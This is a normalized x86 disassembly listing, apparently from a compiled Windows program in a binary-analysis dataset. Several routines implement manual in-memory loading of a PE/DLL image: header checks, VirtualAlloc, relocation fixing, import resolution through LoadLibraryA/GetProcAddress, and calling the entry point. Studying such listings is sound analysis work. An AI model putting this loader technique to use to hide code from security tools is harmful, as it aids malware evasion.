mov eax [ rw-data ]
call sub_464238
mov eax [ rw-data ]
call sub_404650
xor eax eax
mov [ rw-data ] eax
mov [ ebx + 0x5 ] 0x0
sub_464e70
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464ee2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464ee9
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
inc esi
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_409d70
mov ecx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405864
mov edx [ ebp - 0x4 ]
or ecx 0xffffffff
mov eax [ rw-data ]
call sub_4642b4
test al al
je r-xdata
mov [ ebx + 0x5 ] 0x1
sub_464efc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4293dc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_464f83
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x5 ] 0x0
jne r-xdata
mov edx 0x3e8
mov eax [ rw-data ]
call sub_46420c
test al al
je r-xdata
call sub_404f70
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_404650
retn
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_464cf8
mov [ ebp - 0x1 ] al
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov ecx esi
mov edx edi
call sub_45fe8c
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_464f98
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_465082
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_464188
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_46505d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_464228
lea eax [ ebp - 0x4 ]
call sub_405530
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465064
mov eax [ ebp - 0x10 ]
call sub_404650
mov eax [ ebp - 0xc ]
call sub_404650
retn
inc ebx
xor esi esi
push [ ebp - 0x4 ]
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x14 ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4058e0
inc esi
dec ebx
jne r-xdata
sub_46509c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46515b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_465132
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x4 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4055c8
mov eax [ ebp - 0xc ]
call sub_409edc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465162
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
sub_465178
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_465255
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_465223
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x4 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4055c8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46525c
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
sub_4652b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ecx eax
xor eax eax
push ebp
push sub_4652e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ecx
xor edx edx
add eax [ ebp + 0x8 ]
adc edx [ ebp + 0xc ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4652f8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx edx
mov ecx eax
xor eax eax
push ebp
push sub_465330
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ecx
xor edx edx
push edx
push eax
mov eax ebx
xor edx edx
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_465350
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_465348
xor edx edx
push edx
push eax
mov eax ebx
xor edx edx
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
push edx
push eax
movzx eax [ ebx + 0x14 ]
xor edx edx
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
pop ebx
pop ebp
retn 0x4
sub_4653a8
push ebx
push esi
push edi
push ebp
add esp 0xffffff00
mov esi edx
lea edi [ esp + 0x8 ]
push ecx
mov ecx 0x3e
[ edi ] [ esi ]
pop ecx
mov edi ecx
mov [ esp ] eax
mov eax [ edi ]
push eax
call sub_465350
mov [ esp + 0x4 ] eax
mov eax [ edi ]
movzx esi [ eax + 0x6 ]
dec esi
test esi esi
jl r-xdata
add esp 0x100
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
push 0x4
push 0x1000
mov eax [ esp + 0xc ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
mov eax [ eax + 0xc ]
xor edx edx
push edx
push eax
mov eax [ edi + 0x4 ]
call sub_4652b4
push eax
call VirtualAlloc
mov ebx eax
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x14 ]
xor edx edx
push edx
push eax
mov eax [ esp + 0x8 ]
call sub_4652b4
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x10 ]
mov eax ebx
call sub_408560
mov eax [ esp + 0x4 ]
mov [ eax + 0x8 ] ebx
push 0x0
push 0x28
lea eax [ esp + 0xc ]
call sub_465284
mov ebp [ esp + 0x40 ]
test ebp ebp
jle r-xdata
mov eax [ esp + 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
push 0x0
push 0x28
lea eax [ esp + 0xc ]
call sub_465284
jmp r-xdata
push 0x4
push 0x1000
push ebp
mov eax [ esp + 0x10 ]
mov eax [ eax + 0xc ]
xor edx edx
push edx
push eax
mov eax [ edi + 0x4 ]
call sub_4652b4
push eax
call VirtualAlloc
mov ebx eax
mov eax [ esp + 0x4 ]
mov [ eax + 0x8 ] ebx
mov edx ebp
mov eax ebx
xor ecx ecx
call sub_403af4
dec esi
jne r-xdata
sub_4654ac
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edx 0x5
mov eax [ ebp + 0x8 ]
call sub_46538c
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
jbe r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebx ]
xor edx edx
push edx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4652b4
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4652b4
mov [ ebp - 0xc ] eax
push 0x0
push 0x8
mov eax [ ebp - 0x8 ]
call sub_4652b4
mov ebx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
sub eax 0x8
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x18 ]
fdiv [ r-xdata ]
call sub_40345c
mov esi eax
dec esi
test esi esi
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x8 ]
call sub_465284
inc esi
add ebx 0x2
dec esi
jne r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0xc ]
call sub_4652b4
call sub_465284
movzx edi [ ebx ]
shr edi 0xc
movzx eax [ ebx ]
and ax 0xfff
movzx eax ax
mov [ ebp - 0x10 ] eax
cmp edi 0x3
jne r-xdata
sub_465598
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x118 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4657d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov edx 0x1
mov eax esi
call sub_46538c
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4657df
lea eax [ ebp - 0x118 ]
call sub_405530
retn
mov eax [ ebx ]
xor edx edx
push edx
push eax
mov eax [ esi + 0x4 ]
call sub_4652b4
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x14
mov eax [ ebp - 0x8 ]
push eax
call IsBadReadPtr
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
xor edx edx
push edx
push eax
mov eax [ esi + 0x4 ]
call sub_4652b4
call sub_465344
push eax
call LoadLibraryA
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
xor edx edx
push edx
push eax
mov eax [ esi + 0x4 ]
call sub_4652b4
call sub_465344
mov edx eax
lea eax [ ebp - 0x118 ]
call sub_405728
mov ecx [ ebp - 0x118 ]
mov eax rw-data
mov edx r-xdata
call sub_405864
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax [ esi + 0xc ]
inc eax
add eax eax
add eax eax
push eax
mov eax [ esi + 0x8 ]
push eax
call sub_407160
add esp 0x8
mov [ esi + 0x8 ] eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax 0x1
call sub_402ee8
mov [ esi + 0x8 ] eax
mov eax [ esi + 0xc ]
add eax eax
add eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
lea eax [ esi + 0x8 ]
call sub_465284
mov eax [ ebp - 0xc ]
xor edx edx
mov ecx [ esi + 0x8 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
lea eax [ esi + 0x8 ]
call sub_46529c
inc [ esi + 0xc ]
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax rw-data
mov edx r-xdata
call sub_405584
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
xor edx edx
push edx
push eax
mov eax [ esi + 0x4 ]
call sub_4652b4
mov ebx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
mov eax [ esi + 0x4 ]
call sub_4652b4
mov ebx eax
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
xor edx edx
push edx
push eax
mov eax [ esi + 0x4 ]
call sub_4652b4
mov edi eax
jmp r-xdata
mov eax [ ebx ]
call sub_46539c
test al al
je r-xdata
push 0x0
push 0x14
lea eax [ ebp - 0x8 ]
call sub_465284
mov eax [ ebx ]
xor edx edx
push edx
push eax
mov eax [ esi + 0x4 ]
call sub_4652b4
mov edx eax
lea eax [ ebp - 0x112 ]
mov ecx 0x102
call sub_408560
lea eax [ ebp - 0x110 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call GetProcAddress
mov [ edi ] eax
mov eax [ ebx ]
call sub_465394
movzx eax ax
push eax
mov eax [ ebp - 0xc ]
push eax
call GetProcAddress
mov [ edi ] eax
jmp r-xdata
add edi 0x4
add ebx 0x4
mov eax rw-data
mov edx r-xdata
call sub_405584
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
sub_46587c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
test eax 0x4000000
je r-xdata
test eax 0x20000000
je r-xdata
or edx 0x200
test eax 0x40000000
je r-xdata
test eax 0x40000000
je r-xdata
test eax 0x80000000
je r-xdata
test eax 0x80000000
je r-xdata
test eax 0x80000000
je r-xdata
test eax 0x80000000
je r-xdata
or edx 0x1
or edx 0x8
jmp r-xdata
or edx 0x2
jmp r-xdata
or edx 0x4
jmp r-xdata
or edx 0x10
jmp r-xdata
or edx 0x80
jmp r-xdata
or edx 0x20
jmp r-xdata
or edx 0x40
jmp r-xdata
mov eax edx
pop ebp
retn 0x4
sub_4658f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
lea edi [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
call sub_465350
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
movzx ebx [ eax + 0x6 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
inc ebx
mov eax [ edi ]
mov eax [ eax + 0x24 ]
push eax
call sub_46587c
mov esi eax
mov eax [ edi ]
mov edx [ eax + 0x24 ]
test edx 0x4000000
je r-xdata
push 0x4000
mov eax [ edi ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ edi ]
mov eax [ eax + 0x8 ]
push eax
call VirtualFree
push 0x0
push 0x28
mov eax edi
call sub_46529c
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
or esi 0x200
dec ebx
jne r-xdata
push 0x0
push 0x28
mov eax edi
call sub_465284
test dl 0x40
je r-xdata
mov eax [ edi ]
test [ eax + 0x27 ] 0x2
je r-xdata
test dl 0x80
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x20 ]
jmp r-xdata
test eax eax
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x24 ]
lea eax [ ebp - 0x8 ]
push eax
push esi
mov eax [ edi ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ edi ]
mov eax [ eax + 0x8 ]
push eax
call VirtualProtect
test eax eax
jne r-xdata
mov eax rw-data
mov edx r-xdata
call sub_405584
jmp r-xdata
sub_465a0c
push ebp
mov ebp esp
add esp 0xfffffec0
push ebx
push esi
push edi
mov esi eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_465c87
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x48 ]
mov ecx 0x40
mov edx esi
call sub_408560
cmp [ ebp - 0x48 ] 0x5a4d
je r-xdata
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
mov eax esi
call sub_4652b4
mov edx eax
lea eax [ ebp - 0x140 ]
mov ecx 0xf8
call sub_408560
cmp [ ebp - 0x140 ] 0x4550
je r-xdata
mov eax rw-data
mov edx r-xdata
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0x4
push 0x2000
mov eax [ ebp - 0xf0 ]
push eax
mov eax [ ebp - 0x10c ]
push eax
call VirtualAlloc
mov ebx eax
test ebx ebx
jne r-xdata
mov eax rw-data
mov edx r-xdata
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test ebx ebx
jne r-xdata
push 0x4
push 0x2000
mov eax [ ebp - 0xf0 ]
push eax
push 0x0
call VirtualAlloc
mov ebx eax
push 0x11
push 0x0
call GetProcessHeap
push eax
call HeapAlloc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] 0x0
push 0x4
push 0x1000
mov eax [ ebp - 0xf0 ]
push eax
push ebx
call VirtualAlloc
push 0x4
push 0x1000
mov eax [ ebp - 0xec ]
push eax
push ebx
call VirtualAlloc
mov edi eax
mov ecx [ ebp - 0xc ]
add ecx [ ebp - 0xec ]
mov edx esi
mov eax edi
call sub_408560
mov eax edi
xor edx edx
push edx
push eax
mov eax [ ebp - 0xc ]
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov ecx eax
mov eax [ ebp - 0x8 ]
mov [ eax ] ecx
mov edi ebx
mov [ ecx + 0x34 ] edi
mov ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x140 ]
mov eax esi
call sub_4653a8
mov eax ebx
xor edx edx
push edx
push eax
mov eax [ ebp - 0x10c ]
xor edx edx
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
test eax eax
je r-xdata
mov eax rw-data
mov edx r-xdata
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_465598
test al al
jne r-xdata
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4654ac
mov eax [ ebp - 0x8 ]
push eax
call sub_4658f4
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov ecx [ eax + 0x28 ]
test ecx ecx
je r-xdata
mov eax rw-data
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0x8 ]
call sub_466038
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
xor edx edx
push edx
push eax
mov eax ecx
xor edx edx
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov esi eax
test esi esi
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
push 0x0
push 0x1
push edi
call esi
cmp eax 0x1
sbb eax eax
inc eax
test al al
jne r-xdata
mov eax rw-data
mov edx r-xdata
call sub_405584
mov eax [ ebp - 0x8 ]
call sub_466038
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] 0x1
mov eax rw-data
mov edx r-xdata
call sub_405584
mov eax [ ebp - 0x8 ]
call sub_466038
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_465df8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov ebx eax
xor eax eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov eax ebx
call sub_46538c
mov ecx eax
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ecx ]
xor edx edx
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_4652b4
mov ebp eax
cmp [ ebp + 0x18 ] 0x0
je r-xdata
mov eax rw-data
mov edx r-xdata
call sub_405584
jmp r-xdata
mov eax rw-data
mov edx r-xdata
call sub_405584
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ esp + 0x4 ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebp + 0x20 ]
mov eax [ ebx + 0x4 ]
call sub_4652f8
mov edi eax
mov edx [ ebp + 0x24 ]
mov eax [ ebx + 0x4 ]
call sub_4652f8
mov [ esp + 0x10 ] eax
mov esi [ ebp + 0x18 ]
dec esi
test esi esi
jb r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jne r-xdata
inc esi
mov eax [ esp + 0x8 ]
cdq
push edx
push eax
mov eax [ ebp + 0x14 ]
dec eax
xor edx edx
cmp edx [ esp + 0x4 ]
jne r-xdata
mov eax rw-data
mov edx r-xdata
call sub_405584
jmp r-xdata
add edi 0x4
add [ esp + 0x10 ] 0x2
dec esi
jne r-xdata
mov eax [ esp + 0x10 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
jmp r-xdata
pop edx
pop eax
jae r-xdata
cmp eax [ esp ]
mov eax [ edi ]
xor edx edx
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_4652b4
call sub_465344
mov edx eax
mov eax [ esp ]
call sub_40a970
test eax eax
jne r-xdata
mov eax [ esp + 0x8 ]
add eax eax
add eax eax
cdq
push edx
push eax
mov eax [ ebp + 0x1c ]
call sub_4652b4
mov edx eax
mov esi [ ebx + 0x4 ]
mov eax esi
call sub_4652f8
push [ eax + 0x4 ]
push [ eax ]
mov eax esi
call sub_4652b4
mov [ esp + 0x4 ] eax
mov eax rw-data
mov edx r-xdata
call sub_405584
jmp r-xdata
sub_466038
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov ebx edi
test ebx ebx
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x28 ]
xor edx edx
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_4652b4
push 0x0
push 0x0
mov edx [ ebx + 0x4 ]
push edx
call eax
mov [ ebx + 0x10 ] 0x0
mov ebp [ ebx + 0xc ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ ebx + 0x8 ]
push eax
call sub_407148
pop ecx
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
inc ebp
mov [ esp ] 0x0
push edi
push 0x0
call GetProcessHeap
push eax
call HeapFree
xor eax eax
mov edi eax
push 0x8000
push 0x0
push eax
call VirtualFree
je r-xdata
cmp [ ecx ] 0xffffffff
mov eax esi
cdq
push edx
push eax
lea eax [ ebx + 0x8 ]
call sub_46529c
inc [ esp ]
dec ebp
jne r-xdata
mov eax [ ecx ]
push eax
call FreeLibrary
mov esi [ esp ]
add esi esi
add esi esi
mov eax esi
cdq
push edx
push eax
lea eax [ ebx + 0x8 ]
call sub_465284
mov ecx [ edi + 0x8 ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
sub_4660f8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_466129
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466130
retn
mov eax rw-data
call sub_405530
sub_4661b8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_466204
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov ecx esi
xor edx edx
mov eax [ ebx ]
call sub_466268
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4030fc
mov edx esi
mov eax ebx
call sub_46626c
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_46626c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov ecx esi
xor edx edx
mov eax [ ebx ]
call sub_466268
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_466290
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_4662e4
retn
sub_4662c4
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_4662e4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov ecx esi
xor edx edx
mov eax [ ebx ]
call sub_466268
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
add edx edx
add edx edx
lea eax [ ebx + 0x4 ]
call sub_402f34
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_46631c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov ecx esi
xor edx edx
mov eax [ ebx ]
call sub_466268
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4662e4
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
add eax eax
add eax eax
xor ecx ecx
xchg edx eax
call sub_403af4
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_466204
dec ebp
inc edi
jne r-xdata
sub_466424
push ebx
mov ebx eax
push 0x0
lea eax [ ebx + 0x108 ]
push eax
mov eax [ ebx + 0x104 ]
push eax
call acmStreamUnprepareHeader
push 0x0
mov eax [ ebx + 0x104 ]
push eax
call acmStreamClose
mov eax [ ebx + 0xf0 ]
call sub_402f1c
mov eax [ ebx + 0xf4 ]
call sub_402f1c
mov [ ebx + 0xec ] 0x0
mov [ ebx + 0x100 ] 0x0
pop ebx
retn
sub_466470
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x100 ] 0x0
je r-xdata
xor esi esi
mov esi 0x4
jmp r-xdata
mov eax [ ebx + 0xf4 ]
xor ecx ecx
mov edx [ ebx + 0xfc ]
call sub_403af4
or esi 0x4
